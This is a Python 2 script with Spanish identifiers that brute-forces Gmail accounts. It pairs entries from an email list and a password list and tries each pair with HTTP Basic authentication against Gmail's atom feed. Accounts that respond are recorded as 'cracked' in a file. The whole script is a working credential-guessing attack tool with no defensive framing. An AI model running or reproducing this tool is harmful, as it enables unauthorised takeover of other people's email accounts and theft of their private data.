#!/usr/bin/python

from threading import *
from multiprocessing import *
import urllib2, base64
import ctypes
import sys
from sys import exit

diccionario_password = open('diccionario_passwords.txt','r')
passwd = diccionario_password.readlines()
diccionario_password.close()

diccionario_emails = open('diccionario_emails.txt', 'r')
email = diccionario_emails.readlines()
diccionario_emails.close()

def Grabar_Login(login_email, login_password):
    file_crackeados = open('crackeados.txt','a')
    file_crackeados.write(login_email + " - " + "NNNNNNNN" + "\n")
    file_crackeados.close()

def update_progress(progress, username, cracked):
    barLength = 20 # Modify this to change the length of the progress bar
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if not isinstance(progress, float):
        progress = 0
        status = "error: progress var must be float\r\n"
    if progress < 0:
        progress = 0
        status = "Halt...\r\n"
    if progress >= 1:
        progress = 1
        status = "Done...\r\n"
    block = int(round(barLength*progress))
    if (cracked):
        text = "\rStatus Cuenta " + username + ": [{0}] {1}% {2}".format( "="*block + " "*(barLength-block), progress*100, status + " - CRACKED PASSWD")
    else:
        text = "\rStatus Cuenta " + username + ": [{0}] {1}% {2}".format( "="*block + " "*(barLength-block), progress*100, status)
    
    sys.stdout.write(text)
    sys.stdout.flush()

def BruteForce_Gmail(indice_passwd):
    
    global passwd
    global email

    try:

        for indice_email in range(len(email)):

            username = str(email[indice_email]).replace('\n', ''); password = str(passwd[indice_passwd]).replace('\n', '')
            url = "https://mail.google.com/mail/feed/atom/"
            req = urllib2.Request(url)
            authstr = base64.encodestring("%s:%s" % (username, password))[:-1]
            req.add_header("Authorization", "Basic " + authstr)

            respuesta = "Login Request"
            
            try:
                respuesta = urllib2.urlopen(req).read()
                
                print "Email : " + username + " - Password : NNNNNNNN"
                Grabar_Login(username, password)
                update_progress(indice_email + 1, username, True)
                break

            except:
                respuesta = "Login Invalido"
                update_progress(indice_email + 1, username, False)
                print respuesta + " (" + username + " - " + password + ")"
                # if (respuesta.count("<?xml version=", 0, 0) < 0):
                #sys.stdout.write(".")

    except KeyboardInterrupt:
        print "Deteniendo procesos ..."
        sys.exit(1)    

pool = Pool(processes = len(passwd))
    
if __name__ == "__main__":
    
    for index_Thread in range(len(passwd)):
        pool.apply_async(BruteForce_Gmail(index_Thread), ())
        
    pool.close()

    print "\nBruteforce finalizado!"
    sys.exit(1)
